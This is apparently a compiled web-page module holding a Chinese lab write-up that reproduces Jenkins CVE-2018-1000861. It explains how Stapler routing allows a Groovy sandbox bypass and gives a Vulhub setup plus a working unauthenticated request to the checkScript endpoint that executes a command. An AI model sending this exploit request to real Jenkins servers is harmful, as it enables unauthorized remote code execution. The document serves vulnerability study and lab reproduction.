import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as s,c as l,a as e,b as n,d as a,e as i}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),p=e("p",null,"Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。",-1),u=e("p",null,"通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。",-1),h=e("p",null,"参考链接：",-1),g={href:"http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html",target:"_blank",rel:"noopener noreferrer"},m={href:"http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html",target:"_blank",rel:"noopener noreferrer"},b={href:"https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html",target:"_blank",rel:"noopener noreferrer"},_=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Jenkins 2.138，包含漏洞的插件也已经安装：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到一个已经成功初始化的Jenkins，无需再进行任何操作。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241634597.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),f={href:"https://github.com/orangetw/awesome-jenkins-rce-2019",target:"_blank",rel:"noopener noreferrer"},v=i(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true
&amp;value=public class x {
  public x(){
    &quot;touch /tmp/success&quot;.execute()
  }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241636205.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><code>/tmp/success</code>已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241637353.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,4);function k(x,y){const t=o("ExternalLinkIcon");return s(),l("div",null,[d,p,u,h,e("ul",null,[e("li",null,[e("a",g,[n("http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html"),a(t)])]),e("li",null,[e("a",m,[n("http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html"),a(t)])]),e("li",null,[e("a",b,[n("https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html"),a(t)])])]),_,e("p",null,[n("使用 @orangetw 给出的"),e("a",f,[n("一键化POC脚本"),a(t)]),n("，发送如下请求即可成功执行命令：")]),v])}const V=r(c,[["render",k],["__file","Jenkins 远程命令执行漏洞 CVE-2018-1000861.html.vue"]]);export{V as default};
